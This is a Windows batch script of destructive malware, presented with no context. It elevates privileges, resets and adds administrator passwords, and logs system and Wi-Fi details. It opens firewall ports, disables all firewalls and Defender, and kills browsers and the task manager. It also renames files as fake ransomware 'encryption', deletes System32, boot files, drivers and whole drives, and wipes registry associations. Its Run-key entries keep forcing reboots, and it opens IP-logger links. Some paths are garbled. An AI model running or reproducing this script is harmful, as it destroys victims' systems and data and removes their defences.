echo "Hello Sweety!"
echo "Very bad decision!"
powershell -Command "Start-Process cmd -Verb RunAs"
echo "%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5%5"
net user Administrator 1010000101110011111100100110101000010100100110101011100010100011001110100100000110001111001000100010010110001110001111111110010111001000000111110100100101101111011010001001010001001101001
cls
net user %id 1010000101110011111100100110101000010100100110101011100010100011001110100100000110001111001000100010010110001110001111111110010111001000000111110100100101101111011010001001010001001101001
cls
net user /ADD hallo 
net user hallo 1010000101110011111100100110101000010100100110101011100010100011001110100100000110001111001000100010010110001110001111111110010111001000000111110100100101101111011010001001010001001101001
cls
net user /DELETE %id 
ipconfig /release 
echo "say  goodbye to your VIRTUAL MACHINE, pal!"
title %random% %date% %username% %time% %random%
:info 
cls 
nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log
ver>>9K21JM10B.log

ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
netsh wlan show profiles>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Additional Information:>>9K21JM10B.log
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
systeminfo>>9K21JM10B.log
goto ports
ren -=- Opens Port 1122 -=-
:ports
cls & color 0a
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto firewall
ren -=- Turns all Firewalls off -=-
:firewall
cls & color 0a
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
goto encryption
ren -=- Encrypts files with a simple name break -=-
:encryption
cls & color 0a
:Current
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
color 0a & mode 1000 & cls
pause
goto virus
ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
:virus
ECHO You have been encrypted by *-*7_SL*- & color 0a
net stop "Windows Defender Service"
net stop "Windows Firewall"
taskkill /F /IM "chrome.exe" /T
taskkill /F /IM "firefox.exe" /T
taskkill /F /IM "ProcessHacker.exe" /T
taskkill /F /IM "explorer.exe" /T
taskkill /F /IM "taskmgr.exe" /T
goto virus
cd C:/Windows/System32
del /f *.* /q
cd C:/Program Files/Windows Defender
del /f *.* /q
cd C:/Programs Files/Windows Mail
del /f *.* /q
cd C:/Drivers/Audio
del /f *.* /q
cd C:/Windows/Boot/ 
del /f *.* /q
cd C:/Windows/System32/drivers/
del /f *.* /q
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
@echo off
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
cd C:/Windows/Boot/PCAT/
del /f *.* /q
cd C:/Drivers/Audio/source/Realtek/Codec_8699
del /f *.* /q
start chrome https://grabify.link/IY7GDT.exe
cd C:/Drivers/Audio/source/Realtek/RealtekAPO_685
del /f *.* /q
start chrome https://iplogger.org/
cd C:/Drivers/Aduio/Source/Realtek/RealtekService_168
del /f *.* /q
del C:*.* /f /s /q
del D:*.* /f /s /q
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
cd C:/Users/%id/Desktop/
del /f *.* /q
cd C:/Windows/System32
del /f *.* /q
  
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT

PAUSE

PAUSE
reg delete *.* 
echo "Finished!"
echo "Hahahah, dummie!"
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
taskkill  /F /PID 0 